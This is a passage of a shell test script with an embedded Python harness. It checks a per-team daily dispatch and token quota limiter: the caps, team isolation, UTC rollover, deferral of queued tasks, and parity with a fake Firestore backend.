out["I2_teamB_allowed_while_A_capped"] = (bool(rb.get("job_id")) and not rb.get("refused"))

# ── I3: UTC rollover — team A is FRESH the next UTC day (fake clock) ─────────────
rn = do_dispatch(teamA, now=DAY0 + 86400)
out["I3_rollover_resets"] = (bool(rn.get("job_id")) and not rn.get("refused"))
# and STILL capped later the SAME first day (no accidental global reset).
rstill = do_dispatch(teamA, now=DAY0 + 60)
out["I3_same_day_still_capped"] = (rstill.get("reason") == "team-daily-cap")

# ── I4: the TOKEN ceiling refuses independently (counter unit, dispatch cap wide open) ─
lim = B.DailyTeamBudget(home=IHOME)
teamT = "team-T-" + ("f" * 8)
tok_allowed = []
for _ in range(3):
    d = lim.check_and_consume(teamT, tokens=600_000, dispatch_max=1000,
                              token_budget=2_000_000, now=DAY0)
    tok_allowed.append(d.ok)
d4 = lim.check_and_consume(teamT, tokens=600_000, dispatch_max=1000,
                           token_budget=2_000_000, now=DAY0)
out["I4_token_first3_ok"] = all(tok_allowed) and len(tok_allowed) == 3
out["I4_token_4th_refused"] = (not d4.ok and d4.limit_dim == "tokens")
out["I4_token_usage_18M"] = (lim.usage(teamT, now=DAY0) == (3, 1_800_000))

# ── I5: the DRAIN DEFERS a capped task via requeue -> NO attempt burn ────────────
os.environ["HEIMDALL_TEAM_DAILY_DISPATCH_MAX"] = "3"
os.environ["HEIMDALL_TEAM_DAILY_TOKEN_BUDGET"] = "100000000"
DHOME = os.path.join(WORK, "dhome")            # a fresh root so the drain counter starts at 0.
os.makedirs(DHOME, exist_ok=True)
teamD = "team-D-" + ("a" * 8)
# The drain resolves the team's repo via cp_ghinstall.covered_repos — pin it hermetically.
_orig_covered = M.cp_ghinstall.covered_repos
M.cp_ghinstall.covered_repos = lambda tid, home=None: [REPO]
try:
    for i in range(4):
        Q.enqueue(teamD, "daily-cap drain task number %d" % i, home=DHOME)
    res = M.drain_team_queue(
        teamD, home=DHOME, base_env={}, now=DAY0, policy_name="local",
        local_runner=LR, cloud_runner=CR)
finally:
    M.cp_ghinstall.covered_repos = _orig_covered
out["I5_processed"] = res.get("processed")                     # 3 dispatched
out["I5_deferred_count"] = len(res.get("deferred") or [])      # 1 deferred
out["I5_no_retry_no_dead"] = (not res.get("retried") and not res.get("dead"))
# the deferred task is back in queued with attempts UNBURNED (0) — the requeue, not retry, proof.
deferred_id = (res.get("deferred") or [None])[0]
rows = {r["id"]: r for r in Q.list(teamD, home=DHOME)}
drow = rows.get(deferred_id) or {}
out["I5_deferred_queued"] = (drow.get("state") == "queued")
out["I5_deferred_attempts_0"] = (
    ((drow.get("item") or {}).get("attempts")) == 0)

# ── I6: FIRESTORE-FAKE PARITY — identical counter behavior through FirestoreBackend ─
import cp_state_firestore as FS


class _Snap:
    def __init__(self, data):
        self._d = data
        self.exists = data is not None

    def to_dict(self):
        return dict(self._d) if self._d is not None else None


class _DocRef:
    def __init__(self, store, key):
        self._s = store
        self._k = key

    def set(self, doc):
        self._s[self._k] = dict(doc)

    def get(self):
        return _Snap(self._s.get(self._k))


class _CollRef:
    def __init__(self, store, name):
        self._s = store
        self._n = name

    def document(self, doc_id):
        return _DocRef(self._s, (self._n, doc_id))


class _FakeClient:
    def __init__(self):
        self._s = {}

    def collection(self, name):
        return _CollRef(self._s, name)


be = FS.FirestoreBackend(client=_FakeClient(), root="heimdall_cp", project="p")
flim = B.DailyTeamBudget(backend=be)
teamF = "team-F-" + ("b" * 8)
fs_allowed = []
for _ in range(3):
    fs_allowed.append(flim.check_and_consume(
        teamF, tokens=1, dispatch_max=3, token_budget=10**9, now=DAY0).ok)
fcap = flim.check_and_consume(teamF, tokens=1, dispatch_max=3, token_budget=10**9, now=DAY0)
out["I6_fs_first3_ok"] = all(fs_allowed) and len(fs_allowed) == 3
out["I6_fs_capped"] = (not fcap.ok and fcap.limit_dim == "dispatch")
# per-team isolation + rollover ALSO hold under firestore (parity with local).
out["I6_fs_teamG_unaffected"] = flim.check_and_consume(
    "team-G-cccccccc", tokens=1, dispatch_max=3, token_budget=10**9, now=DAY0).ok
out["I6_fs_rollover"] = flim.check_and_consume(
    teamF, tokens=1, dispatch_max=3, token_budget=10**9, now=DAY0 + 86400).ok

print(json.dumps(out, indent=2, sort_keys=True))
PYEOF

iget() { "$PY" -c 'import json,sys; d=json.load(open(sys.argv[1])); v=d.get(sys.argv[2]); print(json.dumps(v) if not isinstance(v,str) else v)' "$IOUT" "$1"; }

if [ ! -s "$IOUT" ]; then echo "FATAL: I harness produced no output" >&2; cat "$WORK/harness_i.err" >&2; exit 2; fi

{ [ "$(iget I1_first_N_allowed)" = "true" ] && [ "$(iget I1_capped_refused)" = "true" ] && [ "$(iget I1_capped_no_job)" = "true" ]; } \
  && ok "I1 dispatch N=3=cap allowed, N+1 REFUSED reason=team-daily-cap (status=$(iget I1_capped_status) dim=$(iget I1_capped_dim)), NO job row" \
  || bad "I1 daily dispatch cap wrong (firstN=$(iget I1_first_N_allowed) refused=$(iget I1_capped_refused) no_job=$(iget I1_capped_no_job))"
[ "$(iget I2_teamB_allowed_while_A_capped)" = "true" ] \
  && ok "I2 FALSIFIER: team B dispatches fine WHILE team A is capped (per-team isolation, not a global kill)" \
  || bad "I2 team B was affected by team A's cap — the counter is NOT per-team isolated"
{ [ "$(iget I3_rollover_resets)" = "true" ] && [ "$(iget I3_same_day_still_capped)" = "true" ]; } \
  && ok "I3 UTC rollover: team A FRESH next UTC day, STILL capped the same first day (fake clock)" \
  || bad "I3 rollover wrong (next_day_fresh=$(iget I3_rollover_resets) same_day_capped=$(iget I3_same_day_still_capped))"
{ [ "$(iget I4_token_first3_ok)" = "true" ] && [ "$(iget I4_token_4th_refused)" = "true" ] && [ "$(iget I4_token_usage_18M)" = "true" ]; } \
  && ok "I4 TOKEN ceiling: 3×600k=1.8M allowed, 4th (2.4M>2M) REFUSED (dim=tokens); usage=(3,1.8M)" \
  || bad "I4 token ceiling wrong (first3=$(iget I4_token_first3_ok) 4th=$(iget I4_token_4th_refused) usage=$(iget I4_token_usage_18M))"
{ [ "$(iget I5_processed)" = "3" ] && [ "$(iget I5_deferred_count)" = "1" ] && [ "$(iget I5_deferred_queued)" = "true" ] && [ "$(iget I5_deferred_attempts_0)" = "true" ] && [ "$(iget I5_no_retry_no_dead)" = "true" ]; } \
  && ok "I5 DRAIN defers a capped task via requeue -> attempts UNBURNED (0), queued, not retried/dead (waits for tomorrow)" \
  || bad "I5 drain deferral wrong (processed=$(iget I5_processed) deferred=$(iget I5_deferred_count) queued=$(iget I5_deferred_queued) attempts0=$(iget I5_deferred_attempts_0) clean=$(iget I5_no_retry_no_dead))"
{ [ "$(iget I6_fs_first3_ok)" = "true" ] && [ "$(iget I6_fs_capped)" = "true" ] && [ "$(iget I6_fs_teamG_unaffected)" = "true" ] && [ "$(iget I6_fs_rollover)" = "true" ]; } \
  && ok "I6 FIRESTORE-FAKE PARITY: same cap/isolation/rollover through FirestoreBackend (get/put_record only, never path())" \
  || bad "I6 firestore parity broke (first3=$(iget I6_fs_first3_ok) capped=$(iget I6_fs_capped) isolation=$(iget I6_fs_teamG_unaffected) rollover=$(iget I6_fs_rollover))"

echo
echo "cp-maintainer: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ] || exit 1
